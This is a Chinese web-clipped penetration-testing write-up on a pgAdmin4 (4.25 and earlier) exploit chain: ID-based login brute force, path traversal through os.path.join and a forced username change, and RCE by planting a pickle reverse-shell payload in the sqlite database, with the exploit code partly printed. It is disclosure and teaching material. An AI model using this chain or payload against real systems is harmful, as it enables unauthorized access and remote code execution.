渗透测试中 审计
python
组合拳 酒仙桥六号部
0day _
队
- MdEditor
“ 渗透测试中 python 审计 0day 组合拳
前⾔
在渗透的时候扫了扫全端⼝，偶遇⼀个系统 pgadmin4，
它是⼀款管理 postgresql 数据库的 web 端程序，
docker pull 50M+。由于渗透测试爆破的时候发现⼀些
⼩细节便开始了这次 python 代码审计，最终发现了
RCE。其中包括多个漏洞利⽤，⽬前 pgadmin4.25 及以
下都存在这些漏洞，和官⽅邮件上报漏洞后 4.26 到最新
版漏洞已修复。
渗透⼊⼝
接到⼀个⽐较棘⼿的项⽬基本资产收集后发现没有软柿⼦
捏，就针对了⼀些⾮ CDN ip 做了全端⼝扫描发现这处
5050 端⼝的 web 资产为 pgadmin4，不管他是啥系
统，没有验证码⼲就完了。
⼀波暴⼒破解后发现⼤量 302 跳转，在刷新⻚⾯时
Cookie 已经可以成功登录系统。
经过判断发现是账号为 1 密码为 123456 成功登录系
统，但是登录成功后发现⽤户名是邮箱。这应该是登录验
证逻辑⽅⾯的缺陷后⾯代码审计部分再关注，⼜去下载了
官⽹源码，代码使⽤框架为 flask，python web 系统后
台也⽐较难直接获取 webshell，索性顺着登录缺陷进⾏
⼀波代码审计。
代码审计
该项⽬挂载 postgres 旗下，当时挖掘还是最新版，上报
后⽬前最新版已修复。
https://github.com/postgres/pgadmin4/tree/REL-
4_24
⼀）⽆需得知 email 的暴⼒破解
先来深⼊了解登录后的账号验证逻辑为什么会产⽣使⽤
1/2/3 这样的序号 id 作为⽤户名的情况。
Flask 项⽬，在登录代码函数路由处下断点。
通过跟踪上图函数。
web/pgadmin/authenticate/ init
.py:48#auth_obj.validate() 最终调⽤了 flask_security
第三⽅库的 forms.py 中的 validate()，我们可以发现
self.email.data 就是我们接⼝中输⼊ email 的值，继续
跟进 get_user 函数。
get_user 参数是⽤来从数据库中获取该 email 的⽤户对
象。
我们的标识符”1” 被传⼊ get_user 函数，当我们传⼊的
email 为数字或者 UUID 将直接使⽤
self.user_model.query.get(1) 从数据库获取⽤户对象并
直接返回，这就造成⽆需匹配邮箱直接匹配数据库主建
id 导致⽆需猜解⽤户名进⾏后台暴⼒破解。
也就是说是 flask_security 的逻辑缺陷导致⽆需得知
email 即可爆破，看到 github 也提出了 issues 但是官⽅
未解决该问题，如果只使⽤官⽅的库进⾏身份验证就会存
在此问题就很离谱。
https://github.com/mattupstate/flask-
security/issues/862
⼆） 后台任意⽂件读取 / 修改
进了后台总要想办法扩⼤危害，这⾥发现了⼀处任意⽂件
读取也⽐较有意思。
1) 在新建服务器时发现可以导⼊ SSL 证书存在⽂件管理
器功能，点击刷新是可以列当前资源⽬录下⽂件并下载。
此时我们抓取数据包将 path 修改为../../../。
分析列⽂件接⼝对应函数 getfolder，程序读取⽤户资源
⽬录。
程序会将⽤户⽬录和前端发送的 path 参数⽬录传⼊安全
检查函数 Filemanager.check_access_permission：
check_access_permission 校验函数的内部会将 path
参数的值和资源⽬录组合并使⽤ os.path.abspath 函数
获取真实路径，最终被还原的真实路径必须要包含资源路
径，这样⽆论我们修改任何跨⽬录格式最终都不会和原有
资源路径匹配造成异常抛出（⻅变量状态栏中 dir 和
orig_path 的差别）。
2) 上⼀条直接跨⽬录的思路断了，只能找找其他突破
⼝，这时发现⽂件上传的暴露的路径中带有⽤户名，也就
是说存储⽬录为【系统⽤户⽬录 + 当前创建的⽤户名】
的组合。
既然⽤户名可控，秉着任何参数都存在⻛险，查看下读取
资源⽬录的函数代码。
程序使⽤ os.path.json ⽅法将源存储⽬录和 username
组合形成新的存储⽬录，看到这个函数基本就稳了。
这⾥介绍下 os.path.json 函数存在的问题。
os.path.json 函数执⾏逻辑：
1) 只要最后⼀个参数为”/” 开头就会忽略之前所有参数然
后返回路径，⻅下图。
这样我们构造漏洞的思路就来了创建⼀个新⽤户（需要管
理员权限也就是 id=1）username 改为”/”，既可以遍历
到根⽬录⼜可以通过 check_access_permission 函数的
路径⽐对校验。
3） ⼜遇到情况了，默认情况下 username 在添加时并
⽆法修改，尝试绕过限制修改 username。
查看 web/pgadmin/tools/user_management/ init
.py:346#update 函数发现后端是通过传递表单对象的⽅
式接收参数，后端其实会接收到我们 POST 发送的
username 参数然后提交数据库。
前台 PUT 修改数据包新增 username 字段即可强制修改
⽤户名。
4） 这下都⻬全了，登录创建的账号访问⽂件管理器接
⼝。
舒服了，访问⽂件管理接⼝成功列出根⽬录。
访问后发现只能遍历⽆法下载？不存在的⼀切只是前端校
验罢了： 从后端找到遍历⽂件模式选择接⼝，只需要将
dialog_type 的类型修改为 storage_dialog 即可。
找到下载⽂件接⼝读取成功。
三） 替换数据库⽂件反序列化 RCE
寻找 RCE 的点，这⾥只是发现了这个⽅法，应该有更加
便捷的点： 思路是找到代码中存在从数据库中取值进⾏
反序列化的操作，此处反序列化原本参数格式要求严格，
但是由于 pgadmin4 默认使⽤ sqlite3，可以直接利⽤⽂
件管理器下载数据库，修改后再上传达到不损坏原始数
据，这样触发该接⼝即可造成反序列化命令执⾏。
1）docker 下默认数据库为 /
var/lib/pgadmin/pgadmin4.db，下载 sqlite 数据库后
进⾏修改然后再上传覆盖源数据库⽂件。
插⼊⼀段反弹 shell 的 python 语句，并修改 sqlite3 数
据库。
import os
import pickle
import socket
import pty
class exp(object):
def __reduce__(self):
a = 'python -c "import socket,subprocess,os;s=socket.s
return (os.system,(a,))
e = exp()
s = pickle.dumps(e)
import sqlite3
# OK, now for the DB part: we make it...:
db = sqlite3.connect('pgadmin4.db')
db.execute('UPDATE process set desc = (?) where pid="1
db.commit()
db.close()
将序列化内容插⼊ desc 字段，然后通过上传接⼝替换数
据库⽂件。
再通过 GET 请求 / misc/bgprocess / 触发反序列化操
作, 程序会读取 process.desc 字段的内容导致触发命令
执⾏。
总结
1. Flask_security 原⽣验证身份函数缺陷。
2. os.path.join 拼接存在特性，编程容易犯错。
3. python 由于⾃身语⾔灵活性，常常会出现前后端
校验不⼀致问题。因为后端喜欢使⽤ setattr 直
接将表单数据赋值到某个对象插⼊数据库。
渗透中的⿊盒测试往往更容易发现能⽩盒审计的功能点，
⽩盒审计下留意系统函数，第三⽅框架的特性多深⼊调试
下源码。
全⽂完
本⽂由 简悦 SimpRead (http://ksria.com/simpread) 优化，⽤以
提升阅读体验
使⽤了 全新的简悦词法分析引擎 beta，点击查看
(http://ksria.com/simpread/docs/#/词法分析引擎)详细说明